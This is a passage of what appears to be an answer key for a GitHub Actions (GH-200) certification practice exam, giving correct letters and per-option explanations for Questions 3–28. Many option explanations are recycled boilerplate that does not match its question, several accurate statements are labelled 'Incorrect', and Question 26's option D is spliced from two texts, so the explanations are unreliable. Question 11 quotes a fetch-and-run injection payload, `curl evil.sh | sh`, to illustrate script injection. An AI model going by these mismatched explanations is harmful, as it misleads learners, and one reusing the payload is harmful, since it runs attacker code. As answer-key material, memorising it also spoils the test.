- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Correct. `workflow_dispatch` validates manual UI/API triggers (`up to 10 typed inputs`), while `workflow_call` exposes typed reusable workflow interfaces.
- **E:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 3 — `B` (Author and manage workflows)

Correct answer: B (is correct). Configuring `paths-ignore: ['charts/**', 'terraform/**']` skips `codec-ci.yml` whenever every modified path in the push matches the ignored directories. [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 4 — `B, E` (Author and manage workflows)

Correct answers: B and E (are correct). Top-level `permissions: {}` sets all default `GITHUB_TOKEN` scopes to `none` so only the job declaring `contents: read` and `checks: write` receives those two scopes, and `cancel-in-progress: true` aborts older runs on the same PR ref when a new commit is pushed. [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **E:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **F:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 5 — `C` (Author and manage workflows)

Correct answer: C (is correct). Yes — under `on: workflow_call: secrets:`, each declared secret accepts `description` and `required: true | false` (`allowing callee steps to guard signing steps when an optional secret is empty`). [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 6 — `C` (Author and manage workflows)

Correct answer: C (is correct). In `container-pack.yml`, declaring `on: workflow_call` (`inputs`, `secrets`, `outputs`), writing the FFmpeg digest to `$GITHUB_OUTPUT` + job `outputs`, calling `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:`, and reading `needs.<id>.outputs.<key>` wires reusable image outputs cleanly. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. A reusable workflow fails without `on: workflow_call`, `$GITHUB_ENV` never crosses jobs, and passing secrets in `with:` leaks plaintext.
- **B:** Incorrect. `workflow_dispatch` cannot be called by `uses:`, `::set-output` is retired, and downstream jobs must `needs:` the reusable workflow job.
- **C:** Correct. Reusable workflows map step `$GITHUB_OUTPUT` -> job `outputs` -> `on.workflow_call.outputs`, which caller jobs read via `needs.<id>.outputs`.
- **D:** Incorrect. Reusable workflows must live in `.github/workflows/`, be invoked at `jobs.<id>.uses` (not `steps:`), and map secrets/outputs explicitly.

### Question 7 — `C` (Author and manage workflows)

Correct answer: C (is correct). `if: failure()` evaluates `true` strictly when an earlier step in the job failed (`and false on success or cancellation`). [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 8 — `B` (Author and manage workflows)

Correct answer: B (is correct). Configuring `timeout-minutes` at the job (`or step`) level sets deterministic upper execution bounds (`up to the 360-minute hosted runner job limit`). [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 9 — `A` (Author and manage workflows)

Correct answer: A (is correct). When `build-wasm` fails, downstream dependent jobs `edge-canary` and `global-rollout` (`without failure() or always() overrides`) are automatically marked `skipped` without provisioning runner VMs. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 10 — `D` (Author and manage workflows)

Correct answer: D (is correct). Yes — combining `always()` with `needs.provision-cdn.result == 'success'` ensures teardown runs even on `e2e-playback` failure or run cancellation while skipping teardown if `provision-cdn` itself never succeeded. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.

### Question 11 — `B` (Author and manage workflows)

Correct answer: B (is correct). Printing `::add-mask::$DRM_NONCE` registers the runtime string with the runner log scrubber immediately before any subsequent step output or log line can echo it. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 12 — `B, C, E` (Author and manage workflows)

Correct answers: B, C, and E (are correct). Append `key=value` (`or key<<DELIM`) to `$GITHUB_OUTPUT` + map `jobs.<id>.outputs` for `needs:` consumers; append `VAR=val` to `$GITHUB_ENV` + dirs to `$GITHUB_PATH` for intra-job steps; and write Markdown tables to `$GITHUB_STEP_SUMMARY` (`<=1 MB/step`). [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **C:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Correct. `$GITHUB_OUTPUT` paired with `jobs.<id>.outputs` is the supported mechanism for passing string metadata between separate jobs.
- **F:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 13 — `A` (Author and manage workflows)

Correct answer: A (is correct). Because both the job `container:` and `services:` join the same user-defined Docker bridge network, tests inside `golang:1.23-bookworm` dial the service label hostname `memcached:11211` directly. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 14 — `D` (Author and manage workflows)

Correct answer: D (is correct). Defining `services.postgres` with `--health-cmd pg_isready`, mapping `ports` (host) or setting job `container:`, waiting for `healthy` status, and dialing `localhost:5432` or `postgres:5432` prevents connection-refused test flakes. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. Service containers require Linux Docker runner hosts and are destroyed automatically when the single job finishes.
- **B:** Incorrect. `services:` is a job-level key (never inside `steps:`), and steps inside a job `container:` dial `postgres:5432` over the Docker bridge.
- **C:** Incorrect. Host-runner steps cannot resolve Docker bridge hostname `postgres` (`use mapped ports + localhost`), and skipping `--health-cmd` causes races.
- **D:** Correct. Service containers run `--health-cmd` probes and connect via `localhost:<port>` on host runners or `<label>:5432` inside job containers.

### Question 15 — `A` (Author and manage workflows)

Correct answer: A (is correct). With `strategy.fail-fast: true`, as soon as ANY matrix leg fails, GitHub Actions immediately cancels all other in-progress and queued jobs in that `strategy.matrix`. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 16 — `A, B` (Author and manage workflows)

Correct answers: A and B (are correct). Use `include:` entries matching `{ os: windows-2025 }` / `{ os: macos-15 }` to attach extra per-OS matrix keys (`like sdk_flags or artifact_ext`) without duplicating jobs, and set `fail-fast: false` so platform-specific linker errors are collected across all OSes in one run. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Correct. `fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.
- **B:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **C:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 17 — `C` (Author and manage workflows)

Correct answer: C (is correct). The YAML merge key `<<: *rust_env` imports all key-value pairs from `&rust_env` into `test.env` while allowing local `RUST_BACKTRACE: "full"` to override the anchored key within the same `.yml` file. [Skill 1.9: Simplify workflow definitions using YAML anchors and aliases within a workflow file | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 18 — `B` (Author and manage workflows)

Correct answer: B (is correct). `github.run_number` increments for each new workflow run in the repository, while `github.run_attempt` starts at `1` and increments (`2`, `3`, ...) each time that `github.run_id` is re-run. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 19 — `A` (Author and manage workflows)

Correct answer: A (is correct). No — GitHub Actions requires either a full-length 40-character commit SHA (`@d7fd7645053907c9bc6b73eb8ff2a27d586dc0fa`), a Git tag, or a branch ref; truncated short SHAs fail resolution (`and fail Enterprise SHA-pinning policy`). [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 20 — `D` (Author and manage workflows)

Correct answer: D (is correct). GitHub Actions evaluates `condition && 'ifTrue' || 'ifFalse'` as an idiomatic ternary expression (`provided the 'ifTrue' value is truthy, i.e., non-empty/non-false/non-zero`). [Skill 1.11: Write expressions using built-in functions and conditional operators | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.

### Question 21 — `D` (Author and manage workflows)

Correct answer: D (is correct). The GitHub Actions VS Code extension parses local `.github/actions/*/action.yml` schemas directly from the workspace (`as well as remote actions`) to autocomplete `with:` inputs and validate `outputs` before pushing commits. [Skill 1.12: Author and validate workflows using IDE extensions and developer tooling | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/quickstart)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.

### Question 22 — `D` (Author and manage workflows)

Correct answer: D (is correct). `actions/cache@v4` sets `outputs.cache-hit` to string `'true'` ONLY on an exact `key` match (`and 'false' or empty on a restore-keys prefix match or complete miss`). [Skill 1.13: Configure dependency caching and manage workflow artifacts and retention | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.

### Question 23 — `D` (Author and manage workflows)

Correct answer: D (is correct). GitHub Actions detects registered/masked secret strings inside job `outputs:` (`and workflow_call outputs`), automatically redacting/dropping secret values from cross-job outputs with a warning so secrets cannot leak across unverified job boundaries (`pass secrets via secrets: or OIDC instead`). [Skill 1.14: Pass data between steps and jobs using outputs, environment variables, and artifacts | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 24 — `B` (Author and manage workflows)

Correct answer: B (is correct). GitHub Actions aggregates `$GITHUB_STEP_SUMMARY` contributions across all steps in a job sequentially in step execution order under that job's heading on the run Summary tab. [Skill 1.15: Publish job summaries and configure workflow status badges | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#adding-a-job-summary)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 25 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). No — specifying `types: [labeled]` overrides default `pull_request` activity types (`opened`, `synchronize`, `reopened`), so pushing new commits will NOT re-trigger `label-gate.yml` unless `synchronize` is also included (`types: [labeled, synchronize]`) and checked via `contains(github.event.pull_request.labels.*.name, 'run-perf')`. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **B:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **C:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 26 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). No — `on: schedule` runs fire ONLY for workflow files present on the repository's default branch (`main`); to test before merging to `main`, trigger the branch workflow via `workflow_dispatch` (`gh workflow run --ref feat/playback-probe`) or `pull_request`. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **B:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **C:** Correct. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `on: schedule` runs fire ONLY for workflow files present on the repository's default branch (`main`); to test before merging to `main`, trigger the branch workflow via `workflow_dispatch` (`gh workflow run --ref feat/playback-probe`) or `pull_request`.

### Question 27 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). On POSIX/Linux runners, exit codes `> 128` equal `128 + signal_number`: `139` (`128 + 11 SIGSEGV`) indicates a native segmentation fault (`compared to 137 = SIGKILL/OOM and 143 = SIGTERM/cancellation`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.

### Question 28 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Yes — modern GitHub Actions supports setting `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` to `true` as either configuration variables (`vars`) OR secrets (`or transiently per re-run via UI Enable debug logging / gh run rerun --debug`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
